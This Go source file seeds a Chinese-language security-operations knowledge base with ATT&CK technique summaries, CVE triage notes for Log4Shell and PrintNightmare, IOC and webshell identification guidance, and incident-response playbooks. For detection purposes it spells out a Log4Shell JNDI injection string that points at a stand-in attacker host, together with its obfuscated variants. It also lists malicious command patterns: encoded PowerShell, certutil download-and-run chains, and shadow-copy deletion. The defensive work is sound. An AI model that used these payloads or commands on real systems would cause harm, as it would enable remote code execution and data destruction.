package main

// seedDoc is one embedded starter knowledge document. Seeds load only into an
// empty database; kb_ingest / -load content always wins afterwards.
type seedDoc struct {
	Collection string
	Title      string
	Body       string
	Source     string
	URL        string
}

var seedDocs = []seedDoc{
	// ---- ATT&CK techniques ----
	{
		Collection: "attack",
		Title:      "T1566 钓鱼攻击（Phishing）",
		Body: `攻击者通过邮件、短信或即时消息投递恶意链接/附件，诱导受害者执行代码或泄露凭据。
子技术：T1566.001 鱼叉式附件、T1566.002 鱼叉式链接、T1566.004 语音钓鱼。
检测要点：发件人域名仿冒（typosquatting）、附件为 lnk/iso/one/带宏 Office、链接指向新注册域名、
邮件头 Received 链路与声称来源不符、SPF/DKIM/DMARC 校验失败。
处置要点：不要在本机打开附件；用 case 工具记录原始邮件头；检索同发件人/同 URL 的其他命中；
按"钓鱼邮件处置预案"执行。`,
		Source: "MITRE ATT&CK",
		URL:    "https://attack.mitre.org/techniques/T1566/",
	},
	{
		Collection: "attack",
		Title:      "T1059 命令与脚本解释器（Command and Scripting Interpreter）",
		Body: `攻击者滥用 cmd、PowerShell、bash、Python 等解释器执行恶意命令。
高危信号：powershell -enc/-e 编码命令、绕过执行策略 -ExecutionPolicy Bypass、
cmd /c 下载执行链（certutil/bitsadmin/curl 下载后运行）、Office 进程派生 shell（winword.exe -> cmd.exe）、
rundll32/regsvr32 加载远程载荷（squiblydoo）。
检测要点：进程创建日志（4688）中父子进程异常、编码命令解码后的内容、命令行中出现下载 URL。
处置要点：提取完整命令行入库为证据；确认发起进程与用户；评估横向移动可能。`,
		Source: "MITRE ATT&CK",
		URL:    "https://attack.mitre.org/techniques/T1059/",
	},
	{
		Collection: "attack",
		Title:      "T1078 有效账户（Valid Accounts）",
		Body: `攻击者使用窃取或默认的合法账户获得初始访问、持久化或权限提升，包括默认账户、域账户、本地账户、云账户。
检测要点：异常时间/地点登录、同一账户多地并发登录、登录失败后成功（暴破成功特征）、
非管理员账户加入管理员组（4728/4732）、MFA 疲劳轰炸后的同意事件。
处置要点：立即禁用涉事账户并重置凭据；回溯该账户 7 日内全部登录与操作；检查该账户的令牌/会话是否仍有效。`,
		Source: "MITRE ATT&CK",
		URL:    "https://attack.mitre.org/techniques/T1078/",
	},
	{
		Collection: "attack",
		Title:      "T1486 为影响而加密数据（勒索软件，Data Encrypted for Impact）",
		Body: `勒索软件批量加密文件并勒索赎金，常伴随删除卷影副本、停止备份服务、投毒备份。
前置信号：批量文件重命名为统一扩展名（.locked/.encrypt 等）、vssadmin delete shadows、
wbadmin delete catalog、taskkill 数据库与备份进程、异常大规模文件写操作。
检测要点：文件服务器短时间大量 rename/write、SMB 单账户批量访问、勒索信文件（README_DECRYPT 等）。
处置要点：第一时间网络隔离而非关机（保留内存证据）；确认加密范围与起始时间；按"勒索事件响应预案"执行。`,
		Source: "MITRE ATT&CK",
		URL:    "https://attack.mitre.org/techniques/T1486/",
	},
	{
		Collection: "attack",
		Title:      "T1021 远程服务（Remote Services）",
		Body: `攻击者利用 RDP、SMB、SSH、WinRM 等远程服务横向移动。
检测要点：异常主机间的 3389/445/22 新建连接、RDP 登录使用管理员且来源非常规跳板、
admin$ / C$ 共享写入、PsExec 特征（PSEXESVC 服务、命名管道路径）。
处置要点：确认源主机是否已失陷；限制域内 445/3389 直达；启用网络分段与跳板审计。`,
		Source: "MITRE ATT&CK",
		URL:    "https://attack.mitre.org/techniques/T1021/",
	},

	// ---- Vulnerabilities ----
	{
		Collection: "vuln",
		Title:      "CVE-2021-44228 Log4Shell（Log4j2 JNDI 注入）",
		Body: `Apache Log4j2 2.0–2.14.1 的 JNDI 查找未限制远程协议，攻击者在任意被日志记录的字符串中
注入 \${jndi:ldap://attacker/a} 即可远程代码执行。CVSS 10.0，影响面极广（Log4Shell）。
排查要点：资产是否引入 log4j-core 2.x；WAF/代理日志中搜索 \${jndi:（注意混淆变体：
\${${lower:j}ndi:、\${${env:NaN:-j}ndi 等）；出网连接指向陌生 LDAP/RMI/DNS 域名。
修复：升级至 2.17.1+；临时缓解设置 log4j2.formatMsgNoLookups=true 并移除 JndiLookup.class。`,
		Source: "NVD / Apache",
		URL:    "https://nvd.nist.gov/vuln/detail/CVE-2021-44228",
	},
	{
		Collection: "vuln",
		Title:      "CVE-2021-34527 PrintNightmare（Windows 打印后台处理程序 RCE）",
		Body: `Windows Print Spooler 的 RpcAddPrinterDriverEx 权限校验缺陷，认证用户可远程以 SYSTEM 执行任意代码。
排查要点：域控与服务器是否开放 445 并启用 Print Spooler；事件日志 808/316 驱动安装记录；
%SystemRoot%\System32\spool\drivers 下异常 dll 落盘。
修复：安装 2021 年 7 月紧急补丁；非必要服务器禁用 Print Spooler 服务；
域控按 KB5005010 限制 Point and Print 驱动安装权限。`,
		Source: "NVD / MSRC",
		URL:    "https://nvd.nist.gov/vuln/detail/CVE-2021-34527",
	},
	{
		Collection: "vuln",
		Title:      "CVE 研判通用清单",
		Body: `研判一个 CVE 是否构成本次告警的威胁，逐项核实并逐条入库证据：
1. 受影响组件是否真实存在于资产清单（版本核对，而非仅看名称）；
2. 暴露面：是否对外可达、是否需要认证、是否有已知在野利用（CISA KEV / EPSS 分数）；
3. 现有防护是否覆盖：WAF 规则、EDR 检测、补丁状态；
4. 利用痕迹：告警时间点前后是否有对应的请求特征、落盘文件、进程行为；
5. 结论需给出"可利用性 + 暴露面 + 痕迹"三要素，缺一不可直接判定误报。`,
		Source: "reasonix-seckb seed",
	},

	// ---- IOC handling ----
	{
		Collection: "ioc",
		Title:      "恶意 IP / 域名研判方法",
		Body: `IP/域名 IOC 研判步骤：
1. 归属与类型：whois/ASN；IDC、代理、Tor 出口、动态家宽的威胁含义不同；
2. 信誉源交叉验证：至少两个独立情报源命中才算高置信；注意情报时效（超过 90 天的命中降权）；
3. 上下文优先：同一 IP 在业务中是否本来就是合法供应商/CDN/扫描器；
4. 被动观察：本环境与该指标的首次/末次/频次交互时间线；
5. 结论分级：confirmed（多源+上下文吻合）/ suspicious（单源或上下文存疑）/ benign（业务合法用途）。`,
		Source: "reasonix-seckb seed",
	},
	{
		Collection: "ioc",
		Title:      "钓鱼邮件 IOC 提取清单",
		Body: `从钓鱼邮件中应提取并入库的指标：
发件人地址与显示名、真实投递域（最后一个 Received）、Reply-To、Message-ID、
邮件头 Authentication-Results（SPF/DKIM/DMARC pass/fail）、
正文全部 URL（含跳转链与短链的最终落地域）、附件哈希（SHA256）与类型、
诱导话术类别（发票/密码过期/快递/高管要求）。
检索规则：用每个指标在邮件网关日志中回溯 30 天，统计命中人数与已点击数。`,
		Source: "reasonix-seckb seed",
	},
	{
		Collection: "ioc",
		Title:      "Webshell 常见特征",
		Body: `Webshell 识别要点：
1. 文件特征：近期新增/修改的 jsp/php/aspx，体积很小或含 eval/base64_decode/Runtime.exec/ProcessBuilder、
变量名随机化、无业务注释；
2. 路径特征：出现在上传目录、静态资源目录中的脚本文件；
3. 访问特征：单文件被单一外部 IP 高频 POST、UA 固定、响应大小异常；
4. 内存马：文件不存在但路由存在时排查过滤器/监听器注入（Tomcat Filter/Valve 内存马）。
处置：先快照取证再删除；回溯上传时间与上传请求，定位入口漏洞。`,
		Source: "reasonix-seckb seed",
	},

	// ---- Playbooks ----
	{
		Collection: "playbook",
		Title:      "钓鱼邮件处置预案",
		Body: `钓鱼邮件处置步骤：
1. 建案：用 case 工具以告警 ID 建案，录入原始邮件头；
2. 提取：按"钓鱼邮件 IOC 提取清单"提取全部指标并逐条入库；
3. 研判：检索知识库匹配 ATT&CK 技术（T1566 系列），研判发件域与落地域；
4. 扩散面：用每个指标回溯邮件网关，确认收件范围与点击情况；
5. 处置：网关封锁发件人/URL、撤回同批次邮件、重置已点击用户凭据；
6. 结论：true_positive/false_positive + 置信度，写清依据的证据 ID。`,
		Source: "reasonix-seckb seed",
	},
	{
		Collection: "playbook",
		Title:      "勒索事件响应预案",
		Body: `勒索事件响应步骤（按小时计）：
1. 隔离：网络隔离受感染主机（拔线/交换机端口关闭），不要关机；
2. 建案：以事件 ID 建案，记录发现时间、首个加密文件时间；
3. 范围：统计被加密主机、共享目录、备份状态（卷影/离线备份是否幸存）；
4. 溯源：定位初始入口（钓鱼/远程服务/漏洞）与横向路径，入库证据；
5. 清除：重置域内凭据、排查持久化（计划任务/服务/注册表）、重建受感染主机；
6. 恢复：从离线备份恢复，恢复前验证备份未被投毒；
7. 报告：时间线 + 证据链 + 整改项。`,
		Source: "reasonix-seckb seed",
	},
	{
		Collection: "playbook",
		Title:      "主机入侵处置预案",
		Body: `主机入侵处置步骤：
1. 建案并确认告警指标：进程、文件、网络连接、账户四维分别取证入库；
2. 判活：确认入侵者当前是否仍活跃（实时进程/连接/登录会话），活跃时优先隔离；
3. 时间线：以首个异常事件为起点重建时间线（入口→落地→持久化→横向/外联）；
4. 清场：终止恶意进程、删除落地文件与持久化项、封禁外联域名、重置本机与关联账户凭据；
5. 验证：清理后持续观察 24–72 小时确认无复发；
6. 结论：写明入口漏洞与整改项后关案。`,
		Source: "reasonix-seckb seed",
	},
}
